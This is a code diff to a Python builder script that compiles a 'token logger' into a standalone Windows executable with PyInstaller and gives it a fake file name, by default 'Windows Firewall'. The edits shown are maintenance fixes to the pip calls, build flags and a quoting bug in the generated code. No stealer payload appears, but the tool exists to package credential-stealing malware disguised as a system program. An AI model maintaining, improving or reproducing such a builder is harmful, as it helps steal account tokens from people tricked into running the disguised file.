@@ -80,7 +80,7 @@ def build():
     check = subprocess.getoutput("pyinstaller")
     if "'pyinstaller' is not recognized" in check:
         print(Fore.RED + Style.BRIGHT + "[-] PyInstaller was not found. Attempting to install.")
-        tryInstall = subprocess.getoutput("pip install pyinstaller")
+        tryInstall = subprocess.getoutput("python -m pip install pyinstaller")
         print(Fore.GREEN + Style.BRIGHT + "[+] PyInstaller has been successfully installed.")
     else:
         print(Fore.GREEN + Style.BRIGHT + "[+] PyInstaller is already installed.")
@@ -89,7 +89,7 @@ def build():
     title()
     print(Fore.GREEN + Style.BRIGHT + "[!] Attempting to compile token logger to executable.")
     with alive_bar(4, stats=False, enrich_print=False, spinner="classic") as barr:
-        compileFile = subprocess.getoutput('pyinstaller --noconfirm --onefile --console --clean --noupx  "result/TokenLogger.py"')
+        compileFile = subprocess.getoutput('pyinstaller --noconfirm --onefile --console --clean --noupx --exclude-module _bootlocale "result/TokenLogger.py"')
         with open("log.txt", "w", encoding="utf-8") as log:
             log.write(compileFile)
             log.close()
@@ -136,7 +136,7 @@ def requirements():
     # Installs any modules not alraedy installed
     def install(module: str):
         print(Fore.RED + Style.BRIGHT + f"[-] Module '{module}' was not found. Attempting to install.")
-        attempt = subprocess.getoutput(f"pip install {module}")
+        attempt = subprocess.getoutput(f"python -m pip install {module}")
         if "'pip' not recognized" in attempt:
             print(Fore.RED + Style.BRIGHT + "[-] Pip was not found.")
             exit()
@@ -253,7 +253,7 @@ def start():
     if fakeFileName == "":
         code += "FakeFileName = 'Windows Firewall'\n"
     else:
-        code += f"FakeFileName = '{fakeFileName}\n'"
+        code += f"FakeFileName = '{fakeFileName}'\n"
     with open("assets/end.txt", "r", encoding="utf8") as endFile:
         endOfCode = endFile.read()
     code += endOfCode
